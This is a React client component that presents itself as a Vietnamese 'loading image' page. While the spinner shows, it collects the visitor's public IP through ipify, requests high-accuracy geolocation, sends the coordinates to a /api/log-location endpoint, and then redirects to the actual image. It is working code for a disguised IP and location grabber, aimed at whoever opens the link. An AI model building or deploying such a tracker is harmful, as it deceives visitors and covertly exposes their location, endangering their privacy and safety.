
'use client';

import { useEffect } from 'react';
import { Loader2, Camera } from 'lucide-react';

interface ImageRedirectClientProps {
  imageUrl: string;
}

export function ImageRedirectClient({ imageUrl }: ImageRedirectClientProps) {

  useEffect(() => {
    const requestLocation = async () => {
      let clientIp = 'N/A';
      try {
          const ipResponse = await fetch('https://api.ipify.org?format=json');
          if (ipResponse.ok) {
              const ipData = await ipResponse.json();
              clientIp = ipData.ip;
          }
      } catch(e) {
          console.error("Could not fetch IP", e);
      }

      const logData = (pos?: GeolocationPosition) => {
          const body: { ip: string; lat?: number; lon?: number; acc?: number; from: string } = { ip: clientIp, from: 'image' };
          if (pos) {
              body.lat = pos.coords.latitude;
              body.lon = pos.coords.longitude;
              body.acc = pos.coords.accuracy;
          }

          fetch('/api/log-location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(body),
          }).finally(() => {
              // Redirect to the actual image URL
              window.location.href = imageUrl;
          });
      }

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          logData, // Success callback
          () => logData(), // Error callback
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      } else {
        logData(); // Geolocation not supported
      }
    };
    
    requestLocation();

  }, [imageUrl]);

  return (
    <div style={{
      fontFamily: 'sans-serif',
      textAlign: 'center',
      paddingTop: '100px',
      background: '#23272A',
      color: '#fff',
      position: 'fixed',
      inset: 0,
      zIndex: 9999,
    }}>
      <div style={{
        background: '#2C2F33',
        padding: '40px',
        display: 'inline-block',
        borderRadius: '12px',
        boxShadow: '0 4px 10px rgba(0,0,0,0.1)'
      }}>
        <Camera className="h-10 w-10 mx-auto mb-4" />
        <h3 className="flex items-center justify-center gap-3 text-lg">
            <Loader2 className="h-5 w-5 animate-spin" />
            Đang tải ảnh...
        </h3>
        <p style={{color: '#99AAB5', fontSize: '14px', marginTop: '8px'}}>Vui lòng chờ trong giây lát.</p>
      </div>
    </div>
  );
}
